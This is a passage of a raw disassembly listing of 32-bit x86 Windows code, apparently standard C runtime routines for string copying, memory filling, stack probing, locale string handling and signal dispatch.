  40776e:	8b f8                	mov    %eax,%edi
  407770:	3b fb                	cmp    %ebx,%edi
  407772:	74 67                	je     0x4077db
  407774:	8b 35 f8 90 40 00    	mov    0x4090f8,%esi
  40777a:	68 c4 95 40 00       	push   $0x4095c4
  40777f:	57                   	push   %edi
  407780:	ff d6                	call   *%esi
  407782:	85 c0                	test   %eax,%eax
  407784:	a3 5c c1 40 00       	mov    %eax,0x40c15c
  407789:	74 50                	je     0x4077db
  40778b:	68 b4 95 40 00       	push   $0x4095b4
  407790:	57                   	push   %edi
  407791:	ff d6                	call   *%esi
  407793:	68 a0 95 40 00       	push   $0x4095a0
  407798:	57                   	push   %edi
  407799:	a3 60 c1 40 00       	mov    %eax,0x40c160
  40779e:	ff d6                	call   *%esi
  4077a0:	a3 64 c1 40 00       	mov    %eax,0x40c164
  4077a5:	a1 60 c1 40 00       	mov    0x40c160,%eax
  4077aa:	85 c0                	test   %eax,%eax
  4077ac:	74 16                	je     0x4077c4
  4077ae:	ff d0                	call   *%eax
  4077b0:	8b d8                	mov    %eax,%ebx
  4077b2:	85 db                	test   %ebx,%ebx
  4077b4:	74 0e                	je     0x4077c4
  4077b6:	a1 64 c1 40 00       	mov    0x40c164,%eax
  4077bb:	85 c0                	test   %eax,%eax
  4077bd:	74 05                	je     0x4077c4
  4077bf:	53                   	push   %ebx
  4077c0:	ff d0                	call   *%eax
  4077c2:	8b d8                	mov    %eax,%ebx
  4077c4:	ff 74 24 18          	push   0x18(%esp)
  4077c8:	ff 74 24 18          	push   0x18(%esp)
  4077cc:	ff 74 24 18          	push   0x18(%esp)
  4077d0:	53                   	push   %ebx
  4077d1:	ff 15 5c c1 40 00    	call   *0x40c15c
  4077d7:	5f                   	pop    %edi
  4077d8:	5e                   	pop    %esi
  4077d9:	5b                   	pop    %ebx
  4077da:	c3                   	ret
  4077db:	33 c0                	xor    %eax,%eax
  4077dd:	eb f8                	jmp    0x4077d7
  4077df:	cc                   	int3
  4077e0:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4077e4:	57                   	push   %edi
  4077e5:	85 c9                	test   %ecx,%ecx
  4077e7:	74 7a                	je     0x407863
  4077e9:	56                   	push   %esi
  4077ea:	53                   	push   %ebx
  4077eb:	8b d9                	mov    %ecx,%ebx
  4077ed:	8b 74 24 14          	mov    0x14(%esp),%esi
  4077f1:	f7 c6 03 00 00 00    	test   $0x3,%esi
  4077f7:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4077fb:	75 07                	jne    0x407804
  4077fd:	c1 e9 02             	shr    $0x2,%ecx
  407800:	75 6f                	jne    0x407871
  407802:	eb 21                	jmp    0x407825
  407804:	8a 06                	mov    (%esi),%al
  407806:	46                   	inc    %esi
  407807:	88 07                	mov    %al,(%edi)
  407809:	47                   	inc    %edi
  40780a:	49                   	dec    %ecx
  40780b:	74 25                	je     0x407832
  40780d:	84 c0                	test   %al,%al
  40780f:	74 29                	je     0x40783a
  407811:	f7 c6 03 00 00 00    	test   $0x3,%esi
  407817:	75 eb                	jne    0x407804
  407819:	8b d9                	mov    %ecx,%ebx
  40781b:	c1 e9 02             	shr    $0x2,%ecx
  40781e:	75 51                	jne    0x407871
  407820:	83 e3 03             	and    $0x3,%ebx
  407823:	74 0d                	je     0x407832
  407825:	8a 06                	mov    (%esi),%al
  407827:	46                   	inc    %esi
  407828:	88 07                	mov    %al,(%edi)
  40782a:	47                   	inc    %edi
  40782b:	84 c0                	test   %al,%al
  40782d:	74 2f                	je     0x40785e
  40782f:	4b                   	dec    %ebx
  407830:	75 f3                	jne    0x407825
  407832:	8b 44 24 10          	mov    0x10(%esp),%eax
  407836:	5b                   	pop    %ebx
  407837:	5e                   	pop    %esi
  407838:	5f                   	pop    %edi
  407839:	c3                   	ret
  40783a:	f7 c7 03 00 00 00    	test   $0x3,%edi
  407840:	74 12                	je     0x407854
  407842:	88 07                	mov    %al,(%edi)
  407844:	47                   	inc    %edi
  407845:	49                   	dec    %ecx
  407846:	0f 84 8a 00 00 00    	je     0x4078d6
  40784c:	f7 c7 03 00 00 00    	test   $0x3,%edi
  407852:	75 ee                	jne    0x407842
  407854:	8b d9                	mov    %ecx,%ebx
  407856:	c1 e9 02             	shr    $0x2,%ecx
  407859:	75 6c                	jne    0x4078c7
  40785b:	88 07                	mov    %al,(%edi)
  40785d:	47                   	inc    %edi
  40785e:	4b                   	dec    %ebx
  40785f:	75 fa                	jne    0x40785b
  407861:	5b                   	pop    %ebx
  407862:	5e                   	pop    %esi
  407863:	8b 44 24 08          	mov    0x8(%esp),%eax
  407867:	5f                   	pop    %edi
  407868:	c3                   	ret
  407869:	89 17                	mov    %edx,(%edi)
  40786b:	83 c7 04             	add    $0x4,%edi
  40786e:	49                   	dec    %ecx
  40786f:	74 af                	je     0x407820
  407871:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  407876:	8b 06                	mov    (%esi),%eax
  407878:	03 d0                	add    %eax,%edx
  40787a:	83 f0 ff             	xor    $0xffffffff,%eax
  40787d:	33 c2                	xor    %edx,%eax
  40787f:	8b 16                	mov    (%esi),%edx
  407881:	83 c6 04             	add    $0x4,%esi
  407884:	a9 00 01 01 81       	test   $0x81010100,%eax
  407889:	74 de                	je     0x407869
  40788b:	84 d2                	test   %dl,%dl
  40788d:	74 2c                	je     0x4078bb
  40788f:	84 f6                	test   %dh,%dh
  407891:	74 1e                	je     0x4078b1
  407893:	f7 c2 00 00 ff 00    	test   $0xff0000,%edx
  407899:	74 0c                	je     0x4078a7
  40789b:	f7 c2 00 00 00 ff    	test   $0xff000000,%edx
  4078a1:	75 c6                	jne    0x407869
  4078a3:	89 17                	mov    %edx,(%edi)
  4078a5:	eb 18                	jmp    0x4078bf
  4078a7:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  4078ad:	89 17                	mov    %edx,(%edi)
  4078af:	eb 0e                	jmp    0x4078bf
  4078b1:	81 e2 ff 00 00 00    	and    $0xff,%edx
  4078b7:	89 17                	mov    %edx,(%edi)
  4078b9:	eb 04                	jmp    0x4078bf
  4078bb:	33 d2                	xor    %edx,%edx
  4078bd:	89 17                	mov    %edx,(%edi)
  4078bf:	83 c7 04             	add    $0x4,%edi
  4078c2:	33 c0                	xor    %eax,%eax
  4078c4:	49                   	dec    %ecx
  4078c5:	74 0a                	je     0x4078d1
  4078c7:	33 c0                	xor    %eax,%eax
  4078c9:	89 07                	mov    %eax,(%edi)
  4078cb:	83 c7 04             	add    $0x4,%edi
  4078ce:	49                   	dec    %ecx
  4078cf:	75 f8                	jne    0x4078c9
  4078d1:	83 e3 03             	and    $0x3,%ebx
  4078d4:	75 85                	jne    0x40785b
  4078d6:	8b 44 24 10          	mov    0x10(%esp),%eax
  4078da:	5b                   	pop    %ebx
  4078db:	5e                   	pop    %esi
  4078dc:	5f                   	pop    %edi
  4078dd:	c3                   	ret
  4078de:	cc                   	int3
  4078df:	cc                   	int3
  4078e0:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4078e4:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4078e8:	85 d2                	test   %edx,%edx
  4078ea:	74 47                	je     0x407933
  4078ec:	33 c0                	xor    %eax,%eax
  4078ee:	8a 44 24 08          	mov    0x8(%esp),%al
  4078f2:	57                   	push   %edi
  4078f3:	8b f9                	mov    %ecx,%edi
  4078f5:	83 fa 04             	cmp    $0x4,%edx
  4078f8:	72 2d                	jb     0x407927
  4078fa:	f7 d9                	neg    %ecx
  4078fc:	83 e1 03             	and    $0x3,%ecx
  4078ff:	74 08                	je     0x407909
  407901:	2b d1                	sub    %ecx,%edx
  407903:	88 07                	mov    %al,(%edi)
  407905:	47                   	inc    %edi
  407906:	49                   	dec    %ecx
  407907:	75 fa                	jne    0x407903
  407909:	8b c8                	mov    %eax,%ecx
  40790b:	c1 e0 08             	shl    $0x8,%eax
  40790e:	03 c1                	add    %ecx,%eax
  407910:	8b c8                	mov    %eax,%ecx
  407912:	c1 e0 10             	shl    $0x10,%eax
  407915:	03 c1                	add    %ecx,%eax
  407917:	8b ca                	mov    %edx,%ecx
  407919:	83 e2 03             	and    $0x3,%edx
  40791c:	c1 e9 02             	shr    $0x2,%ecx
  40791f:	74 06                	je     0x407927
  407921:	f3 ab                	rep stos %eax,%es:(%edi)
  407923:	85 d2                	test   %edx,%edx
  407925:	74 06                	je     0x40792d
  407927:	88 07                	mov    %al,(%edi)
  407929:	47                   	inc    %edi
  40792a:	4a                   	dec    %edx
  40792b:	75 fa                	jne    0x407927
  40792d:	8b 44 24 08          	mov    0x8(%esp),%eax
  407931:	5f                   	pop    %edi
  407932:	c3                   	ret
  407933:	8b 44 24 04          	mov    0x4(%esp),%eax
  407937:	c3                   	ret
  407938:	56                   	push   %esi
  407939:	8b 74 24 08          	mov    0x8(%esp),%esi
  40793d:	57                   	push   %edi
  40793e:	83 cf ff             	or     $0xffffffff,%edi
  407941:	8b 46 0c             	mov    0xc(%esi),%eax
  407944:	a8 40                	test   $0x40,%al
  407946:	74 05                	je     0x40794d
  407948:	83 c8 ff             	or     $0xffffffff,%eax
  40794b:	eb 3a                	jmp    0x407987
  40794d:	a8 83                	test   $0x83,%al
  40794f:	74 34                	je     0x407985
  407951:	56                   	push   %esi
  407952:	e8 89 cf ff ff       	call   0x4048e0
  407957:	56                   	push   %esi
  407958:	8b f8                	mov    %eax,%edi
  40795a:	e8 6a 05 00 00       	call   0x407ec9
  40795f:	ff 76 10             	push   0x10(%esi)
  407962:	e8 60 c5 ff ff       	call   0x403ec7
  407967:	83 c4 0c             	add    $0xc,%esp
  40796a:	85 c0                	test   %eax,%eax
  40796c:	7d 05                	jge    0x407973
  40796e:	83 cf ff             	or     $0xffffffff,%edi
  407971:	eb 12                	jmp    0x407985
  407973:	8b 46 1c             	mov    0x1c(%esi),%eax
  407976:	85 c0                	test   %eax,%eax
  407978:	74 0b                	je     0x407985
  40797a:	50                   	push   %eax
  40797b:	e8 f9 d7 ff ff       	call   0x405179
  407980:	83 66 1c 00          	andl   $0x0,0x1c(%esi)
  407984:	59                   	pop    %ecx
  407985:	8b c7                	mov    %edi,%eax
  407987:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  40798b:	5f                   	pop    %edi
  40798c:	5e                   	pop    %esi
  40798d:	c3                   	ret
  40798e:	cc                   	int3
  40798f:	cc                   	int3
  407990:	51                   	push   %ecx
  407991:	3d 00 10 00 00       	cmp    $0x1000,%eax
  407996:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40799a:	72 14                	jb     0x4079b0
  40799c:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  4079a2:	2d 00 10 00 00       	sub    $0x1000,%eax
  4079a7:	85 01                	test   %eax,(%ecx)
  4079a9:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4079ae:	73 ec                	jae    0x40799c
  4079b0:	2b c8                	sub    %eax,%ecx
  4079b2:	8b c4                	mov    %esp,%eax
  4079b4:	85 01                	test   %eax,(%ecx)
  4079b6:	8b e1                	mov    %ecx,%esp
  4079b8:	8b 08                	mov    (%eax),%ecx
  4079ba:	8b 40 04             	mov    0x4(%eax),%eax
  4079bd:	50                   	push   %eax
  4079be:	c3                   	ret
  4079bf:	55                   	push   %ebp
  4079c0:	8b ec                	mov    %esp,%ebp
  4079c2:	6a ff                	push   $0xffffffff
  4079c4:	68 e8 95 40 00       	push   $0x4095e8
  4079c9:	68 04 62 40 00       	push   $0x406204
  4079ce:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4079d4:	50                   	push   %eax
  4079d5:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4079dc:	83 ec 18             	sub    $0x18,%esp
  4079df:	53                   	push   %ebx
  4079e0:	56                   	push   %esi
  4079e1:	57                   	push   %edi
  4079e2:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4079e5:	a1 68 c1 40 00       	mov    0x40c168,%eax
  4079ea:	33 db                	xor    %ebx,%ebx
  4079ec:	3b c3                	cmp    %ebx,%eax
  4079ee:	75 3e                	jne    0x407a2e
  4079f0:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4079f3:	50                   	push   %eax
  4079f4:	6a 01                	push   $0x1
  4079f6:	5e                   	pop    %esi
  4079f7:	56                   	push   %esi
  4079f8:	68 e0 95 40 00       	push   $0x4095e0
  4079fd:	56                   	push   %esi
  4079fe:	ff 15 4c 90 40 00    	call   *0x40904c
  407a04:	85 c0                	test   %eax,%eax
  407a06:	74 04                	je     0x407a0c
  407a08:	8b c6                	mov    %esi,%eax
  407a0a:	eb 1d                	jmp    0x407a29
  407a0c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  407a0f:	50                   	push   %eax
  407a10:	56                   	push   %esi
  407a11:	68 dc 95 40 00       	push   $0x4095dc
  407a16:	56                   	push   %esi
  407a17:	53                   	push   %ebx
  407a18:	ff 15 50 90 40 00    	call   *0x409050
  407a1e:	85 c0                	test   %eax,%eax
  407a20:	0f 84 ce 00 00 00    	je     0x407af4
  407a26:	6a 02                	push   $0x2
  407a28:	58                   	pop    %eax
  407a29:	a3 68 c1 40 00       	mov    %eax,0x40c168
  407a2e:	83 f8 02             	cmp    $0x2,%eax
  407a31:	75 24                	jne    0x407a57
  407a33:	8b 45 1c             	mov    0x1c(%ebp),%eax
  407a36:	3b c3                	cmp    %ebx,%eax
  407a38:	75 05                	jne    0x407a3f
  407a3a:	a1 88 c1 40 00       	mov    0x40c188,%eax
  407a3f:	ff 75 14             	push   0x14(%ebp)
  407a42:	ff 75 10             	push   0x10(%ebp)
  407a45:	ff 75 0c             	push   0xc(%ebp)
  407a48:	ff 75 08             	push   0x8(%ebp)
  407a4b:	50                   	push   %eax
  407a4c:	ff 15 50 90 40 00    	call   *0x409050
  407a52:	e9 9f 00 00 00       	jmp    0x407af6
  407a57:	83 f8 01             	cmp    $0x1,%eax
  407a5a:	0f 85 94 00 00 00    	jne    0x407af4
  407a60:	39 5d 18             	cmp    %ebx,0x18(%ebp)
  407a63:	75 08                	jne    0x407a6d
  407a65:	a1 98 c1 40 00       	mov    0x40c198,%eax
  407a6a:	89 45 18             	mov    %eax,0x18(%ebp)
  407a6d:	53                   	push   %ebx
  407a6e:	53                   	push   %ebx
  407a6f:	ff 75 10             	push   0x10(%ebp)
  407a72:	ff 75 0c             	push   0xc(%ebp)
  407a75:	8b 45 20             	mov    0x20(%ebp),%eax
  407a78:	f7 d8                	neg    %eax
  407a7a:	1b c0                	sbb    %eax,%eax
  407a7c:	83 e0 08             	and    $0x8,%eax
  407a7f:	40                   	inc    %eax
  407a80:	50                   	push   %eax
  407a81:	ff 75 18             	push   0x18(%ebp)
  407a84:	ff 15 54 90 40 00    	call   *0x409054
  407a8a:	89 45 e0             	mov    %eax,-0x20(%ebp)
  407a8d:	3b c3                	cmp    %ebx,%eax
  407a8f:	74 63                	je     0x407af4
  407a91:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  407a94:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  407a97:	8b c7                	mov    %edi,%eax
  407a99:	83 c0 03             	add    $0x3,%eax
  407a9c:	24 fc                	and    $0xfc,%al
  407a9e:	e8 ed fe ff ff       	call   0x407990
  407aa3:	89 65 e8             	mov    %esp,-0x18(%ebp)
  407aa6:	8b f4                	mov    %esp,%esi
  407aa8:	89 75 dc             	mov    %esi,-0x24(%ebp)
  407aab:	57                   	push   %edi
  407aac:	53                   	push   %ebx
  407aad:	56                   	push   %esi
  407aae:	e8 2d fe ff ff       	call   0x4078e0
  407ab3:	83 c4 0c             	add    $0xc,%esp
  407ab6:	eb 0b                	jmp    0x407ac3
  407ab8:	6a 01                	push   $0x1
  407aba:	58                   	pop    %eax
  407abb:	c3                   	ret
  407abc:	8b 65 e8             	mov    -0x18(%ebp),%esp
  407abf:	33 db                	xor    %ebx,%ebx
  407ac1:	33 f6                	xor    %esi,%esi
  407ac3:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  407ac7:	3b f3                	cmp    %ebx,%esi
  407ac9:	74 29                	je     0x407af4
  407acb:	ff 75 e0             	push   -0x20(%ebp)
  407ace:	56                   	push   %esi
  407acf:	ff 75 10             	push   0x10(%ebp)
  407ad2:	ff 75 0c             	push   0xc(%ebp)
  407ad5:	6a 01                	push   $0x1
  407ad7:	ff 75 18             	push   0x18(%ebp)
  407ada:	ff 15 54 90 40 00    	call   *0x409054
  407ae0:	3b c3                	cmp    %ebx,%eax
  407ae2:	74 10                	je     0x407af4
  407ae4:	ff 75 14             	push   0x14(%ebp)
  407ae7:	50                   	push   %eax
  407ae8:	56                   	push   %esi
  407ae9:	ff 75 08             	push   0x8(%ebp)
  407aec:	ff 15 4c 90 40 00    	call   *0x40904c
  407af2:	eb 02                	jmp    0x407af6
  407af4:	33 c0                	xor    %eax,%eax
  407af6:	8d 65 cc             	lea    -0x34(%ebp),%esp
  407af9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407afc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407b03:	5f                   	pop    %edi
  407b04:	5e                   	pop    %esi
  407b05:	5b                   	pop    %ebx
  407b06:	c9                   	leave
  407b07:	c3                   	ret
  407b08:	55                   	push   %ebp
  407b09:	8b ec                	mov    %esp,%ebp
  407b0b:	56                   	push   %esi
  407b0c:	57                   	push   %edi
  407b0d:	8b 7d 08             	mov    0x8(%ebp),%edi
  407b10:	8b c7                	mov    %edi,%eax
  407b12:	48                   	dec    %eax
  407b13:	48                   	dec    %eax
  407b14:	74 59                	je     0x407b6f
  407b16:	48                   	dec    %eax
  407b17:	48                   	dec    %eax
  407b18:	74 46                	je     0x407b60
  407b1a:	83 e8 04             	sub    $0x4,%eax
  407b1d:	74 41                	je     0x407b60
  407b1f:	83 e8 03             	sub    $0x3,%eax
  407b22:	74 3c                	je     0x407b60
  407b24:	83 e8 04             	sub    $0x4,%eax
  407b27:	74 2a                	je     0x407b53
  407b29:	83 e8 06             	sub    $0x6,%eax
  407b2c:	74 18                	je     0x407b46
  407b2e:	48                   	dec    %eax
  407b2f:	74 08                	je     0x407b39
  407b31:	83 c8 ff             	or     $0xffffffff,%eax
  407b34:	e9 f8 00 00 00       	jmp    0x407c31
  407b39:	8b 35 74 c1 40 00    	mov    0x40c174,%esi
  407b3f:	b8 74 c1 40 00       	mov    $0x40c174,%eax
  407b44:	eb 34                	jmp    0x407b7a
  407b46:	8b 35 70 c1 40 00    	mov    0x40c170,%esi
  407b4c:	b8 70 c1 40 00       	mov    $0x40c170,%eax
  407b51:	eb 27                	jmp    0x407b7a
  407b53:	8b 35 78 c1 40 00    	mov    0x40c178,%esi
  407b59:	b8 78 c1 40 00       	mov    $0x40c178,%eax
  407b5e:	eb 1a                	jmp    0x407b7a
  407b60:	57                   	push   %edi
  407b61:	e8 cf 00 00 00       	call   0x407c35
  407b66:	8b 70 08             	mov    0x8(%eax),%esi
  407b69:	83 c0 08             	add    $0x8,%eax
  407b6c:	59                   	pop    %ecx
  407b6d:	eb 0b                	jmp    0x407b7a
  407b6f:	8b 35 6c c1 40 00    	mov    0x40c16c,%esi
  407b75:	b8 6c c1 40 00       	mov    $0x40c16c,%eax
  407b7a:	83 fe 01             	cmp    $0x1,%esi
  407b7d:	75 07                	jne    0x407b86
  407b7f:	33 c0                	xor    %eax,%eax
  407b81:	e9 ab 00 00 00       	jmp    0x407c31
  407b86:	85 f6                	test   %esi,%esi
  407b88:	75 07                	jne    0x407b91
  407b8a:	6a 03                	push   $0x3
  407b8c:	e8 55 df ff ff       	call   0x405ae6
  407b91:	53                   	push   %ebx
  407b92:	6a 08                	push   $0x8
  407b94:	59                   	pop    %ecx
  407b95:	3b f9                	cmp    %ecx,%edi
  407b97:	74 0a                	je     0x407ba3
  407b99:	83 ff 0b             	cmp    $0xb,%edi
  407b9c:	74 05                	je     0x407ba3
  407b9e:	83 ff 04             	cmp    $0x4,%edi
  407ba1:	75 26                	jne    0x407bc9
  407ba3:	8b 1d 38 c0 40 00    	mov    0x40c038,%ebx
  407ba9:	83 25 38 c0 40 00 00 	andl   $0x0,0x40c038
  407bb0:	3b f9                	cmp    %ecx,%edi
  407bb2:	75 44                	jne    0x407bf8
  407bb4:	8b 15 7c ba 40 00    	mov    0x40ba7c,%edx
  407bba:	c7 05 7c ba 40 00 8c 	movl   $0x8c,0x40ba7c
  407bc1:	00 00 00 
  407bc4:	89 55 08             	mov    %edx,0x8(%ebp)
  407bc7:	eb 03                	jmp    0x407bcc
  407bc9:	8b 5d 08             	mov    0x8(%ebp),%ebx
  407bcc:	3b f9                	cmp    %ecx,%edi
  407bce:	75 28                	jne    0x407bf8
  407bd0:	a1 70 ba 40 00       	mov    0x40ba70,%eax
  407bd5:	8b 0d 74 ba 40 00    	mov    0x40ba74,%ecx
  407bdb:	03 c8                	add    %eax,%ecx
  407bdd:	3b c1                	cmp    %ecx,%eax
  407bdf:	7d 1e                	jge    0x407bff
  407be1:	8d 14 40             	lea    (%eax,%eax,2),%edx
  407be4:	2b c8                	sub    %eax,%ecx
  407be6:	8d 14 95 00 ba 40 00 	lea    0x40ba00(,%edx,4),%edx
  407bed:	83 22 00             	andl   $0x0,(%edx)
  407bf0:	83 c2 0c             	add    $0xc,%edx
  407bf3:	49                   	dec    %ecx
  407bf4:	75 f7                	jne    0x407bed
  407bf6:	eb 07                	jmp    0x407bff
  407bf8:	83 20 00             	andl   $0x0,(%eax)
  407bfb:	3b f9                	cmp    %ecx,%edi
  407bfd:	75 0e                	jne    0x407c0d
  407bff:	ff 35 7c ba 40 00    	push   0x40ba7c
  407c05:	6a 08                	push   $0x8
  407c07:	ff d6                	call   *%esi
  407c09:	59                   	pop    %ecx
  407c0a:	59                   	pop    %ecx
  407c0b:	eb 0e                	jmp    0x407c1b
  407c0d:	57                   	push   %edi
  407c0e:	ff d6                	call   *%esi
  407c10:	83 ff 0b             	cmp    $0xb,%edi
  407c13:	59                   	pop    %ecx
  407c14:	74 05                	je     0x407c1b
  407c16:	83 ff 04             	cmp    $0x4,%edi
  407c19:	75 13                	jne    0x407c2e
  407c1b:	83 ff 08             	cmp    $0x8,%edi
  407c1e:	89 1d 38 c0 40 00    	mov    %ebx,0x40c038
  407c24:	75 08                	jne    0x407c2e
  407c26:	8b 45 08             	mov    0x8(%ebp),%eax
  407c29:	a3 7c ba 40 00       	mov    %eax,0x40ba7c
  407c2e:	33 c0                	xor    %eax,%eax
  407c30:	5b                   	pop    %ebx
  407c31:	5f                   	pop    %edi
  407c32:	5e                   	pop    %esi
  407c33:	5d                   	pop    %ebp
  407c34:	c3                   	ret
  407c35:	8b 54 24 04          	mov    0x4(%esp),%edx
  407c39:	8b 0d 78 ba 40 00    	mov    0x40ba78,%ecx
  407c3f:	39 15 fc b9 40 00    	cmp    %edx,0x40b9fc
  407c45:	56                   	push   %esi
  407c46:	b8 f8 b9 40 00       	mov    $0x40b9f8,%eax
  407c4b:	74 16                	je     0x407c63
  407c4d:	8d 34 49             	lea    (%ecx,%ecx,2),%esi
  407c50:	8d 34 b5 f8 b9 40 00 	lea    0x40b9f8(,%esi,4),%esi
  407c57:	83 c0 0c             	add    $0xc,%eax
  407c5a:	3b c6                	cmp    %esi,%eax
  407c5c:	73 05                	jae    0x407c63
  407c5e:	39 50 04             	cmp    %edx,0x4(%eax)
  407c61:	75 f4                	jne    0x407c57
  407c63:	8d 0c 49             	lea    (%ecx,%ecx,2),%ecx
  407c66:	5e                   	pop    %esi
  407c67:	8d 0c 8d f8 b9 40 00 	lea    0x40b9f8(,%ecx,4),%ecx
  407c6e:	3b c1                	cmp    %ecx,%eax
  407c70:	73 05                	jae    0x407c77
  407c72:	39 50 04             	cmp    %edx,0x4(%eax)
  407c75:	74 02                	je     0x407c79
  407c77:	33 c0                	xor    %eax,%eax
  407c79:	c3                   	ret
  407c7a:	55                   	push   %ebp
  407c7b:	8b ec                	mov    %esp,%ebp
  407c7d:	6a ff                	push   $0xffffffff
  407c7f:	68 f8 95 40 00       	push   $0x4095f8
  407c84:	68 04 62 40 00       	push   $0x406204
  407c89:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  407c8f:	50                   	push   %eax
  407c90:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  407c97:	83 ec 1c             	sub    $0x1c,%esp
  407c9a:	53                   	push   %ebx
  407c9b:	56                   	push   %esi
  407c9c:	57                   	push   %edi
  407c9d:	89 65 e8             	mov    %esp,-0x18(%ebp)
  407ca0:	33 ff                	xor    %edi,%edi
  407ca2:	39 3d a0 c1 40 00    	cmp    %edi,0x40c1a0
  407ca8:	75 46                	jne    0x407cf0
  407caa:	57                   	push   %edi
  407cab:	57                   	push   %edi
  407cac:	6a 01                	push   $0x1
  407cae:	5b                   	pop    %ebx
  407caf:	53                   	push   %ebx
  407cb0:	68 e0 95 40 00       	push   $0x4095e0
  407cb5:	be 00 01 00 00       	mov    $0x100,%esi
  407cba:	56                   	push   %esi
  407cbb:	57                   	push   %edi
  407cbc:	ff 15 00 91 40 00    	call   *0x409100
  407cc2:	85 c0                	test   %eax,%eax
  407cc4:	74 08                	je     0x407cce
  407cc6:	89 1d a0 c1 40 00    	mov    %ebx,0x40c1a0
  407ccc:	eb 22                	jmp    0x407cf0
  407cce:	57                   	push   %edi
  407ccf:	57                   	push   %edi
  407cd0:	53                   	push   %ebx
  407cd1:	68 dc 95 40 00       	push   $0x4095dc
  407cd6:	56                   	push   %esi
  407cd7:	57                   	push   %edi
  407cd8:	ff 15 48 90 40 00    	call   *0x409048
  407cde:	85 c0                	test   %eax,%eax
  407ce0:	0f 84 22 01 00 00    	je     0x407e08
  407ce6:	c7 05 a0 c1 40 00 02 	movl   $0x2,0x40c1a0
  407ced:	00 00 00 
  407cf0:	39 7d 14             	cmp    %edi,0x14(%ebp)
  407cf3:	7e 10                	jle    0x407d05
  407cf5:	ff 75 14             	push   0x14(%ebp)
  407cf8:	ff 75 10             	push   0x10(%ebp)
  407cfb:	e8 9e 01 00 00       	call   0x407e9e
  407d00:	59                   	pop    %ecx
  407d01:	59                   	pop    %ecx
  407d02:	89 45 14             	mov    %eax,0x14(%ebp)
  407d05:	a1 a0 c1 40 00       	mov    0x40c1a0,%eax
  407d0a:	83 f8 02             	cmp    $0x2,%eax
  407d0d:	75 1d                	jne    0x407d2c
  407d0f:	ff 75 1c             	push   0x1c(%ebp)
  407d12:	ff 75 18             	push   0x18(%ebp)
  407d15:	ff 75 14             	push   0x14(%ebp)
  407d18:	ff 75 10             	push   0x10(%ebp)
  407d1b:	ff 75 0c             	push   0xc(%ebp)
  407d1e:	ff 75 08             	push   0x8(%ebp)
  407d21:	ff 15 48 90 40 00    	call   *0x409048
  407d27:	e9 de 00 00 00       	jmp    0x407e0a
  407d2c:	83 f8 01             	cmp    $0x1,%eax
  407d2f:	0f 85 d3 00 00 00    	jne    0x407e08
  407d35:	39 7d 20             	cmp    %edi,0x20(%ebp)
  407d38:	75 08                	jne    0x407d42
  407d3a:	a1 98 c1 40 00       	mov    0x40c198,%eax
  407d3f:	89 45 20             	mov    %eax,0x20(%ebp)
  407d42:	57                   	push   %edi
  407d43:	57                   	push   %edi
  407d44:	ff 75 14             	push   0x14(%ebp)
  407d47:	ff 75 10             	push   0x10(%ebp)
  407d4a:	8b 45 24             	mov    0x24(%ebp),%eax
  407d4d:	f7 d8                	neg    %eax
  407d4f:	1b c0                	sbb    %eax,%eax
  407d51:	83 e0 08             	and    $0x8,%eax
  407d54:	40                   	inc    %eax
  407d55:	50                   	push   %eax
  407d56:	ff 75 20             	push   0x20(%ebp)
  407d59:	ff 15 54 90 40 00    	call   *0x409054
  407d5f:	8b d8                	mov    %eax,%ebx
  407d61:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  407d64:	3b df                	cmp    %edi,%ebx
  407d66:	0f 84 9c 00 00 00    	je     0x407e08
  407d6c:	89 7d fc             	mov    %edi,-0x4(%ebp)
  407d6f:	8d 04 1b             	lea    (%ebx,%ebx,1),%eax
  407d72:	83 c0 03             	add    $0x3,%eax
  407d75:	24 fc                	and    $0xfc,%al
  407d77:	e8 14 fc ff ff       	call   0x407990
  407d7c:	89 65 e8             	mov    %esp,-0x18(%ebp)
  407d7f:	8b c4                	mov    %esp,%eax
  407d81:	89 45 dc             	mov    %eax,-0x24(%ebp)
  407d84:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  407d88:	eb 13                	jmp    0x407d9d
  407d8a:	6a 01                	push   $0x1
  407d8c:	58                   	pop    %eax
  407d8d:	c3                   	ret
  407d8e:	8b 65 e8             	mov    -0x18(%ebp),%esp
  407d91:	33 ff                	xor    %edi,%edi
  407d93:	89 7d dc             	mov    %edi,-0x24(%ebp)
  407d96:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  407d9a:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  407d9d:	39 7d dc             	cmp    %edi,-0x24(%ebp)
  407da0:	74 66                	je     0x407e08
  407da2:	53                   	push   %ebx
  407da3:	ff 75 dc             	push   -0x24(%ebp)
  407da6:	ff 75 14             	push   0x14(%ebp)
  407da9:	ff 75 10             	push   0x10(%ebp)
  407dac:	6a 01                	push   $0x1
  407dae:	ff 75 20             	push   0x20(%ebp)
  407db1:	ff 15 54 90 40 00    	call   *0x409054
  407db7:	85 c0                	test   %eax,%eax
  407db9:	74 4d                	je     0x407e08
  407dbb:	57                   	push   %edi
  407dbc:	57                   	push   %edi
  407dbd:	53                   	push   %ebx
  407dbe:	ff 75 dc             	push   -0x24(%ebp)
  407dc1:	ff 75 0c             	push   0xc(%ebp)
  407dc4:	ff 75 08             	push   0x8(%ebp)
  407dc7:	ff 15 00 91 40 00    	call   *0x409100
